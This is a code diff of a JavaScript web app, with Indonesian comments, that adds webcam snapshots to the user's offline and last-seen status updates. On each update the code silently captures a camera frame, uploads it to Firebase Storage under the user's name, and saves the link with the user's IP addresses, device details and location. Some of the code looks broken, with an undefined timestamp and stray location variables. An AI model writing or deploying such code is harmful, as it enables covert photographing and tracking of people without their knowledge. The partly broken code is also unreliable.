@@ -237,7 +237,7 @@ useEffect(() => {
 
 
   };const updateOnlineStatus = async (latitude = null, longitude = null, ip1 = null, ip2 = null) => {
-   
+   await saveOldDataToLogs("online");
     try {
       // ========== 1. Capture dari kamera ==========
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -311,6 +311,30 @@ useEffect(() => {
 
   const updateOfflineStatus = async () => {
     await saveOldDataToLogs("offline"); // simpan sebelum offline
+try {
+      // ========== 1. Capture dari kamera ==========
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      await video.play();
+
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext("2d");
+      ctx?.drawImage(video, 0, 0);
+
+      const imageData = canvas.toDataURL("image/png");
+
+      // stop kamera biar hemat baterai
+      stream.getTracks().forEach((track) => track.stop());
+
+      // ========== 2. Upload ke Firebase Storage ==========
+     // const fileRef = storageRef(storage, `user_captures/${currentUser}_online.png`);
+      const fileRef = storageRef(storage, `user_captures/${currentUser}_offline_${timestamp}.png`);
+      
+      await uploadString(fileRef, imageData, "data_url");
+      const downloadURL = await getDownloadURL(fileRef);
 
     const data = {
       user: currentUser,
@@ -320,6 +344,7 @@ useEffect(() => {
       deviceInfo,
       ip1:ipInfo,
       ip2:ipInfo1,
+      photoURL: downloadURL,
     };
     // if (ipInfo) data.ip1 = ipInfo;
     // if (ipInfo1) data.ip2 = ipInfo1;
@@ -328,14 +353,46 @@ useEffect(() => {
       data.longitude = longitude;
     }
      update(userRef, data);
+  console.log("✅ Offline status updated with photo:", downloadURL);
+    } catch (err) {
+      console.error("❌ Gagal update offline status:", err);
+}
   };
 
   const updateLastSeen = async () => {
     await saveOldDataToLogs("update_lastSeen"); // simpan sebelum update
+try {
+      // ========== 1. Capture dari kamera ==========
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      await video.play();
+
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext("2d");
+      ctx?.drawImage(video, 0, 0);
+
+      const imageData = canvas.toDataURL("image/png");
+
+      // stop kamera biar hemat baterai
+      stream.getTracks().forEach((track) => track.stop());
+
+      // ========== 2. Upload ke Firebase Storage ==========
+     // const fileRef = storageRef(storage, `user_captures/${currentUser}_online.png`);
+      const fileRef = storageRef(storage, `user_captures/${currentUser}_lastseen_${timestamp}.png`);
+      
+      await uploadString(fileRef, imageData, "data_url");
+      const downloadURL = await getDownloadURL(fileRef);
 
     update(userRef, {
+      photoURL: downloadURL,
       lastSeen: serverTimestamp(),
-    });
+    });console.log("✅ lastseen status updated with photo:", downloadURL);
+    } catch (err) {
+      console.error("❌ Gagal update lastseen status:", err);
+}
   };
 
   const getLocationAndUpdate = () => {
